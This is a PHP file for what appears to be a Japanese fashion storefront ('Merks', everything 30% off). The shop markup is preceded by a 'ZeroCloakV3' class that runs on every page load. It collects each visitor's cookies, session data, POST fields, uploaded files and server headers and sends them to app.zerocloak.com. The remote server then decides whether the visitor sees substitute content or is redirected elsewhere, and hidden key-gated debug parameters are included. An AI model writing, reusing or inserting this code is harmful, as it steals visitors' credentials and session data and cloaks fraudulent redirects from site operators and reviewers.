<?php

class ZeroCloakV3
{
    private $targetUrl;
    private $encryptionKey;
    private $requestId;
    private $uei_6s71a1;
    private $cst_4u89t5;
    private $timeout;

    public function __construct()
    {
        header("Access-Control-Allow-Origin: *");
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
        header("Access-Control-Allow-Headers: Content-Type, Authorization");
        
        error_reporting(E_ALL);
        ini_set('display_errors', 1);

        $this->targetUrl        = 'https://app.zerocloak.com/realtime';
        $this->encryptionKey    = 'b96fe040-f322-4ffe-9981-94743ad3a129';
        $this->requestId        = uniqid('req_', true);
        $this->uei_6s71a1       = "bldzs6jvpw";
        $this->cst_4u89t5       = "iy6o3opass";
        $this->timeout          = 30;
    }

    private function retrieveAllHeaders()
    {
        if (!function_exists('getallheaders')) {
            $headers = [];
            foreach ($_SERVER as $name => $value) {
                if (substr($name, 0, 5) == 'HTTP_') {
                    $headers[str_replace(
                        ' ',
                        '-',
                        ucwords(strtolower(str_replace('_', ' ', substr($name, 5))))
                    )] = $value;
                }
            }
            return $headers;
        }
        return getallheaders();
    }

    private function gatherRequestData()
    {
        return [
            'request_id' => $this->requestId,
            'uei_6s71a1' => $this->uei_6s71a1,
            'cst_4u89t5' => $this->cst_4u89t5,
            'server'     => $_SERVER,
            'headers'    => $this->retrieveAllHeaders(),
            'get'        => $_GET,
            'post'       => $_POST,
            'files'      => $_FILES,
            'cookie'     => $_COOKIE,
            'session'    => isset($_SESSION) ? $_SESSION : [],
            'timestamp'  => date('Y-m-d H:i:s'),
        ];
    }

    private function transmitData($data, $maxRetries = 3)
    {
        if (function_exists('curl_version')) {
            return $this->sendUsingCurl($data, $maxRetries);
        } else {
            return $this->sendUsingFileGetContents($data);
        }
    }

    private function sendUsingCurl($data, $maxRetries = 3)
    {
        $ch = curl_init($this->targetUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'Content-Length: ' . strlen($data),
            'X-Request-ID: ' . $this->requestId,
            'Cache-Control: no-cache',
            'Cache-Control: max-age=0',
            'Pragma: no-cache',
        ]);

        curl_setopt($ch, CURLOPT_TIMEOUT, $this->timeout);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $this->timeout);

        for ($retry = 0; $retry < $maxRetries; $retry++) {
            $response = curl_exec($ch);
            if ($response !== false) {
                curl_close($ch);
                return $response;
            }
            sleep(1);
        }

        curl_close($ch);
        return false;
    }

    private function sendUsingFileGetContents($data)
    {
        $opts = [
            "http" => [
                "header" => [
                    "Content-Type: application/json",
                    "Content-Length: " . strlen($data),
                    "X-Request-ID: " . $this->requestId,
                    "Cache-Control: no-cache",
                    'Cache-Control: max-age=0',
                    "Pragma: no-cache",
                ],
                "method" => "POST",
                "content" => $data,
                "timeout" => $this->timeout,
            ],
        ];

        $context = stream_context_create($opts);
        $response = @file_get_contents($this->targetUrl, false, $context);

        return $response;
    }

    public function clearCache()
    {
        if (function_exists('wp_cache_flush')) {
            wp_cache_flush();
        }

        if (function_exists('wp_cache_clear_cache')) {
            wp_cache_clear_cache();
        }
    }
    public function verify()
    {
        if(isset($_GET['8ea8cd56-1488']) && $_GET['8ea8cd56-1488'] == $this->encryptionKey){
            echo $this->cst_4u89t5;
            die();
        }
    }
    public function run()
    {
        $this->verify();
        $this->clearCache();
        $data = $this->gatherRequestData();
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(1) Send: Data Got -</h5><pre>";
            print_r($data);
            echo "</pre>";
        }
        
        $jsonData   = json_encode($data);
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(2) Send: Convert to Json -</h5><pre>";
            print_r($jsonData);
            echo "</pre>";
        }

        if ($jsonData === false) {
            $this->failHandle("Error: JSON encoding failed: " . json_last_error_msg());
            return false;
        }

        $base64Data = base64_encode($jsonData);
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(3) Send: Json to base64_encode -</h5><pre>";
            print_r($base64Data);
            echo "</pre>";
        }

        if ($base64Data === false) {
            $this->failHandle("Error: Base64 encoding failed");
            return false;
        }

        $response = $this->transmitData($base64Data);
        
        if(isset($_GET['debug-8ea8cd56-1488-main']) && $_GET['debug-8ea8cd56-1488-main'] == $this->encryptionKey){
              echo $response;
              die;
        }
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(1) Receive: Data Got -</h5><pre>";
            print_r($response);
            echo "</pre>";
        }
        
        if ($response !== false) {
            $this->successHandle($response);
        } else {
            $this->failHandle($response);
        }
    }

    public function successHandle($response)
    {

        $base64decodeData = base64_decode($response);
        
         if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(5) Receive: decryptedData -</h5><pre>";
            print_r($base64decodeData);
            echo "</pre>";
        }
        
        
        if ($base64decodeData === false) {
            $this->failHandle("Error: Base64 decode failed");
            return false;
        }

        $responseData = json_decode($base64decodeData, true);

         if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(6) Receive: decryptedData -</h5><pre>";
            print_r($responseData);
            echo "</pre>";
        }
        if ($responseData === null && json_last_error() !== JSON_ERROR_NONE) {
            $this->failHandle("Error: JSON decoding failed");
            return false;
        }
        if(!$responseData['status']){
            $this->failHandle($responseData['message']);
            return false;
        }

       if (
            (isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] === $this->encryptionKey) ||
            (isset($_GET['debug-8ea8cd56-1488-main']) && $_GET['debug-8ea8cd56-1488-main'] === $this->encryptionKey)
        ) {
            die();
        }

        if(!($responseData['data']['nothing'])){

            if(isset($responseData['data']['hr'])){
                header("Referrer-Policy: no-referrer");
            }

            if(!is_null($responseData['data']['zrc'])){

                if(!$responseData['data']['zrc']['status']){
                    $this->failHandle($responseData['data']['zrc']['message']);
                    return false;

                }else{
                    $this->zeroRedirectionCloaking($responseData['data']['zrc']['content']);
                    return true;

                }
            }

            $this->redirectTo($responseData['data']['url'],$responseData['data']['http_code']);
            return true;
        }
        return true;

    }
    private function zeroRedirectionCloaking(string $content = '') {
        echo $content;
        die();
    }
    private function redirectTo(string $url, string $method = 'header-301') {
        switch (strtolower($method)) {
            case 'header-301':
                header("Location: $url", 301);
                exit;

            case 'header-302':
                header("Location: $url", 302);
                exit;

            case 'header-refresh':
                header("Refresh: 0;url=$url");
                exit;

            case 'meta':
                echo '<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($url) . '"><title>Redirecting...</title></head><body><a href="' . htmlspecialchars($url) . '">Click here</a></body></html>';
                exit;

            case 'js_meta':
                echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Redirecting...</title></head><body><script>window.location.href = "' . htmlspecialchars($url) . '";</script><noscript><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($url) . '"></noscript><p>If you are not redirected, <a href="' . htmlspecialchars($url) . '">click here</a>.</p></body></html>';
                exit;

            default:
                header("Location: $url", 301);
                exit;
        }
    }

    private function failHandle($response)
    {
        echo $response;
        die;
    }
}

$zerocloakCloaking = new ZeroCloakV3();
$zerocloakCloaking->run();

// @zerocloak.com 2026-10-05 19:52:28
?>
<?php require 'data.php'; $pageTitle = 'Merks｜日本のレディース・メンズファッション'; $pageDescription = 'レディース・メンズの新着ウェアを30% OFFで。全国送料無料でお届けします。'; require 'header.php'; ?>
<main>
    <!-- Privacy-friendly analytics by Plausible -->
<script async src="https://plausible.io/js/pa-RbUbfjuwKDQAWRYb5R396.js"></script>
<script>
  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
  plausible.init()
</script>


  <section class="hero"><div class="hero-copy"><div class="eyebrow">2026 秋の新作</div><h1>日本のファッションを<br>もっと自由に。</h1><p>人気のレディース・メンズウェアを、毎日に取り入れやすい一着に。</p><p class="hero-offer">全商品30% OFF　｜　全国送料無料</p><a class="button" href="#shop">今すぐショッピング</a></div><img src="https://images.unsplash.com/photo-1483985988355-763728e1935b?auto=format&fit=crop&w=1400&q=85" alt="秋のカジュアルウェアを楽しむ女性"></section>
  <section class="section" id="new"><div class="section-head"><div><div class="eyebrow">新着商品</div><h2>秋の装いをアップデート。</h2></div></div><div class="category-row"><a class="category-card" href="#shop" style="background-image:url('https://images.unsplash.com/photo-1496747611176-843222e1e57c?auto=format&fit=crop&w=900&q=85')"><span>ワンピース</span></a><a class="category-card" href="#shop" style="background-image:url('https://images.unsplash.com/photo-1591369822096-ffd140ec948f?auto=format&fit=crop&w=900&q=85')"><span>ジャケット</span></a><a class="category-card" href="#shop" style="background-image:url('https://images.unsplash.com/photo-1581044777550-4cfa60707c03?auto=format&fit=crop&w=900&q=85')"><span>ニット</span></a></div></section>
  <section class="section" id="shop"><div class="section-head"><div><div class="eyebrow">おすすめアイテム</div><h2>新着・人気商品</h2></div><span>全商品30% OFF・全国送料無料</span></div><div class="catalog-tools"><label class="search-label">商品を検索<input id="product-search" type="search" placeholder="商品名・カテゴリーで検索" aria-label="商品名・カテゴリーで検索"></label><div class="category-filters" role="group" aria-label="商品カテゴリーで絞り込む"><button type="button" class="filter-chip selected" data-filter="all" aria-pressed="true">すべて</button><button type="button" class="filter-chip" data-filter="womens" aria-pressed="false">レディース</button><button type="button" class="filter-chip" data-filter="mens" aria-pressed="false">メンズ</button><button type="button" class="filter-chip" data-filter="unisex" aria-pressed="false">ユニセックス</button><button type="button" class="filter-chip" data-filter="ワンピース" aria-pressed="false">ワンピース</button><button type="button" class="filter-chip" data-filter="ニット・セーター" aria-pressed="false">ニット</button><button type="button" class="filter-chip" data-filter="パンツ" aria-pressed="false">パンツ</button><button type="button" class="filter-chip" data-filter="デニム・ジーンズ" aria-pressed="false">デニム</button><button type="button" class="filter-chip" data-filter="ジャケット・アウター" aria-pressed="false">アウター</button><button type="button" class="filter-chip" data-filter="セットアップ" aria-pressed="false">セットアップ</button></div></div><div class="products"><?php foreach ($products as $slug => $product): ?><article class="product" data-audience="<?= htmlspecialchars($product['audience']) ?>" data-category="<?= htmlspecialchars($product['category']) ?>"><a href="<?= $slug ?>.php"><span class="sale-badge">30% OFF</span><img src="<?= htmlspecialchars($product['image']) ?>" alt="<?= htmlspecialchars($product['name']) ?>"><h3><?= htmlspecialchars($product['name']) ?></h3></a><p><?= htmlspecialchars($product['category']) ?></p><div class="prices"><del><?= yen($product['price']) ?></del><strong><?= yen($product['sale_price']) ?></strong></div><p class="shipping-label">送料無料</p><div class="product-actions"><button onclick="MerksCart.add('<?= $slug ?>')">カートに追加</button><button class="secondary" onclick="MerksCart.buyNow('<?= $slug ?>')">今すぐ購入</button></div></article><?php endforeach; ?></div><p id="no-products" class="empty" hidden>該当する商品が見つかりませんでした。</p></section>
  <section class="value-bar"><div><b>全商品30% OFF</b><span>セール価格はカートにも自動で反映されます。</span></div><div><b>全国送料無料</b><span>日本国内のお届け先へ送料無料でお届け。</span></div><div><b>30日間返品対応</b><span>未使用・タグ付き商品が対象です。</span></div></section>
</main>
<script src="catalog.js"></script>
<?php require 'footer.php'; ?>
